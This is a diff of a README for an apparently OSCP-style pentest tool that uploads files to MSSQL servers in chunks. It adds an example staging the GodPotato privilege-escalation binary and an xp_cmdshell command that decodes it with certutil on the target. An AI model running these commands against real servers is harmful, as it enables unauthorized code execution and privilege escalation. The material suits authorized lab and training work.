@@ -29,12 +29,12 @@ pip install -r requirements.txt   # requirements.txt contains: impacket
 
 ## Usage
 ```
-python3 uploader_write_decode_cmds.py <host> <username> <password> <local_file> --target "C:\\Users\\Public" [options]
+python3 mssql-file-uploader.py <host> <username> <password> <local_file> --target "C:\\Users\\Public" [options]
 ```
 
 ## Example
 ```
-python3 uploader_write_decode_cmds.py 10.10.205.148 "oscp.exam/sql_svc" 'Dolphin1' /home/kali/payload.exe --target "C:\\Users\\Public" --windows-auth
+python3 mssql-file-uploader.py 10.10.110.148 "delta.com/sql_svc" Sapphire123 ~/OSCP/tools/GodPotato-NET4.exe --target "C:\users\public" --windows-auth --chunk-size 1000 --retries 2
 ```
 
 ## Common options
@@ -49,12 +49,16 @@ The script uploads <local_file>.b64 to the remote path you specify (or default C
 It writes helper files locally in decode_commands/ to guide decoding on the target (decode_certutil.sql, powershell_cmd.txt, gethash_sql.sql, etc.)
 
 ## Decoding recommendations
-1. Use the SQL files with Impacket -file (safer for quoting and length). Example:
+1. Use the recommended commands. Example
+```
+impacket-mssqlclient "delta.com/sql_svc:Sapphire1231@10.10.110.148" -windows-auth -command "EXEC xp_cmdshell 'cmd /C \"certutil -decode C:\users\public\GodPotato-NET4.exe.b64 C:\users\public\GodPotato-NET4.exe\"';"
+```
+2. Use the SQL files with Impacket -file (safer for quoting and length). Example:
 ```
 impacket-mssqlclient "user:pass@host" -file decode_commands/decode_certutil.sql
 ```
-2. If you have interactive access on the host, run certutil -decode or the PowerShell one-liner present in powershell_cmd.txt.
-3. Always verify SHA256 after decoding. Example helper in gethash_sql.sql.
+3. If you have interactive access on the host, run certutil -decode or the PowerShell one-liner present in powershell_cmd.txt.
+4. Always verify SHA256 after decoding. Example helper in gethash_sql.sql.
 
 ## Security & Legal
 Only use this tool on systems you are explicitly authorized to test.
